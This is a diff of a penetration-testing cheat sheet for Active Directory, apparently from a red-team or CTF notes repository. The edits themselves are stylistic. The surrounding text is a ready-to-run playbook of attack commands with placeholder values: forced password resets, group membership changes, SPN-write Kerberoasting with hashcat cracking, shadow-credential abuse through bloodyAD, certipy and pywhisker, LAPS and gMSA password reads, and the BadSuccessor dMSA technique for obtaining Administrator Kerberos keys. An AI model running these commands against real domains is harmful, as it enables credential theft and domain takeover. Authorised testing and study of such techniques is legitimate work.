@@ -24,7 +24,7 @@ net rpc user password '<TARGET-USER>' '<NEW-PW>' -U '<DOMAIN>\<USER>%<PW>' -S <D
 bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-IP> add groupMember '<TARGET-GROUP>' '<USER>'
 net rpc group addmem '<TARGET-GROUP>' '<USER>' -U '<DOMAIN>\<USER>%<PW>' -S <DC-IP>
 ```
-- `net rpc user password`, not `net rpc password` — the subcommand lives under `user`.
+- `net rpc user password`, not `net rpc password`: the subcommand lives under `user`.
 
 ## Targeted Kerberoast (SPN write)
 AD module, SPN-write confirmed. Add one SPN, never replace the set:
@@ -49,13 +49,13 @@ Set-ADUser $Victim -Server $DC -Credential $Cred -ServicePrincipalNames @{Remove
 - Continue only if the `setspn -Q` shows the proof SPN is unused.
 
 ### From Kali, no Windows foothold needed
-Without a Windows foothold, `GetUserSPNs.py -request-user` just returns "No entries found" — the account has no SPN to request a ticket for. Write one first:
+Without a Windows foothold, `GetUserSPNs.py -request-user` returns "No entries found": the account has no SPN to request a ticket for. Write one first:
 ```bash
 bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-FQDN> -k set object '<TARGET-USER>' servicePrincipalName -v 'proof/<TARGET-USER>.<DOMAIN.TLD>'
 impacket-GetUserSPNs -dc-ip <DC-IP> -request-user '<TARGET-USER>' -outputfile target-tgs.txt '<DOMAIN.TLD>/<USER>'
 hashcat -m 13100 target-tgs.txt /usr/share/wordlists/rockyou.txt
 ```
-Cleanup (same command without `-v`, deletes the attribute — only safe if the account had no SPN before):
+Cleanup (same command without `-v`, deletes the attribute; only safe if the account had no SPN before):
 ```bash
 bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-FQDN> -k set object '<TARGET-USER>' servicePrincipalName
 ```
@@ -97,16 +97,16 @@ bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-FQDN> set restore <DELET
   --newParent OU=<OU>,DC=<DOMAIN>,DC=<TLD>
 ```
 ## Shadow credentials
-`GenericAll`/`GenericWrite` on a user, or a dedicated `AddKeyCredentialLink`. Needs writable `msDS-KeyCredentialLink` + PKINIT support on a DC (Server 2016+); AD CS is not required — `bloodyAD` does the PKINIT itself, no CA involved. Gives an NT hash and a TGT with no password cracking.
+`GenericAll`/`GenericWrite` on a user, or a dedicated `AddKeyCredentialLink`. Needs writable `msDS-KeyCredentialLink` + PKINIT support on a DC (Server 2016+). AD CS is not required: `bloodyAD` does the PKINIT, no CA involved. Gives an NT hash and a TGT without cracking.
 
 ```bash
 bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-IP> add shadowCredentials '<TARGET>'
 ```
-Cleanup — **omitting `--key` removes every KeyCredentialLink entry on the target, not just the one just added**; pass the sha256 key ID the `add` command printed:
+Cleanup. **Omitting `--key` removes every KeyCredentialLink entry on the target, including ones you didn't add.** Pass the sha256 key ID the `add` command printed:
 ```bash
 bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-IP> remove shadowCredentials '<TARGET>' --key '<KEY-SHA256>'
 ```
-`certipy`/`pywhisker` alternative (useful when `bloodyAD`'s own PKINIT path fails, or AD CS is already in play): `certipy shadow auto` restores the original Key Credentials itself — no separate cleanup step.
+`certipy`/`pywhisker` alternative (when `bloodyAD`'s PKINIT path fails, or AD CS is already in play). `certipy shadow auto` restores the original Key Credentials, so there is no separate cleanup step.
 ```bash
 certipy shadow auto -account '<TARGET>' -u '<USER>@<DOMAIN.TLD>' -p '<PW>' -dc-ip <DC-IP>
 pywhisker.py -d <DOMAIN.TLD> -u '<USER>' -p '<PW>' --target '<TARGET>' -a add --export PFX --filename shadow-cred
@@ -117,7 +117,7 @@ pywhisker.py -d <DOMAIN.TLD> -u '<USER>' -p '<PW>' --target '<TARGET>' -a remove
 - `pywhisker -a add` prints the `DEVICE-ID` to pass to `-a remove` later; it does not self-clean like `certipy shadow auto`.
 
 ### GenericWrite on a user: which path first
-Shadow credentials first, roast (Kerberoast/AS-REP) second. Both roasts still need the password to crack — a non-crackable hash (rockyou miss) dead-ends there. Shadow creds gives the NT hash and a TGT directly, no cracking, as long as PKINIT is supported.
+Shadow credentials first, roast (Kerberoast/AS-REP) second. Both roasts need the password cracked, so a rockyou miss ends there. Shadow creds gives the NT hash and a TGT directly, as long as PKINIT is supported.
 - After either, check the account's `MemberOf` before moving on: `Remote Management Users` means the hash alone is a WinRM shell → [remote-access](../enum/remote-access.md#winrm).
 
 ## LAPS / gMSA read
@@ -125,11 +125,11 @@ Shadow credentials first, roast (Kerberoast/AS-REP) second. Both roasts still ne
 bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-IP> get object '<HOSTNAME>$' --attr ms-Mcs-AdmPwd
 bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-IP> get object '<GMSA>$' --attr msDS-ManagedPassword
 ```
-- `msDS-ManagedPassword` comes back pre-decoded (`NT` hash + base64 current password) — no separate gMSA-blob parsing step.
+- `msDS-ManagedPassword` comes back pre-decoded (`NT` hash + base64 current password). No separate gMSA-blob parsing.
 - Full LAPS attribute set (Windows LAPS JSON, encrypted variants), domain-wide gMSA enum, and ticket use: [managed-credentials](managed-credentials.md).
 
 ## BadSuccessor / dMSA
-Needs: a DC2025 (Windows Server 2025 schema, dMSA Kerberos support) + a KDS root key already provisioned domain-wide + create rights for a new dMSA object somewhere. Creates a dMSA, points its `msDS-ManagedAccountPrecededByLink` at the victim, then S4U2self-impersonates the dMSA to get the victim's Kerberos keys back in the TGS — no password, no prior access to the victim at all.
+Needs: a DC2025 (Windows Server 2025 schema, dMSA Kerberos support) + a KDS root key already provisioned domain-wide + create rights for a new dMSA object somewhere. Creates a dMSA, points its `msDS-ManagedAccountPrecededByLink` at the victim, then S4U2self-impersonates the dMSA to get the victim's Kerberos keys in the TGS. No password and no prior access to the victim needed.
 ```bash
 bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-IP> add badSuccessor '<DMSA-NAME>' -t 'CN=Administrator,CN=Users,DC=<DOMAIN>,DC=<TLD>'
 ```
